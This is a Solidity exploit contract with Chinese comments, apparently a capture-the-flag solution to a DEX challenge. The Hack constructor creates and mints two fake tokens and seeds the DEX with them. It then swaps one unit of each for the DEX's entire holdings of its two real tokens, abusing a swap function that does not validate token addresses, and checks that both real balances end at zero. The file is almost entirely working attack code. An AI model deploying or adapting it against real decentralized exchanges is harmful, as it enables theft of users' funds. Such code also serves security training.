// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract Hack {
    constructor(IDex dex) {
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();

        myToken1.mint(2);
        myToken2.mint(2);

        // 先发送给交易所假代币量 1
        myToken1.transfer(address(dex), 1);
        myToken2.transfer(address(dex), 1);

        // 批准交易所可使用的假代币量 1
        myToken1.approve(address(dex), 1);
        myToken2.approve(address(dex), 1);

        // token out amount = 100 = （amount in * 100） / 1
        // amount in = 1
        // 发送 1 个 假代币1来获得 100 个 token1;
        dex.swap(address(myToken1), address(token1), 1);
        dex.swap(address(myToken2), address(token2), 1);

        require(
            token1.balanceOf(address(dex)) == 0,
            "dex token balance 1 != 0"
        );
        require(
            token2.balanceOf(address(dex)) == 0,
            "dex token balance 2 != 0"
        );
    }
}

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract MyToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
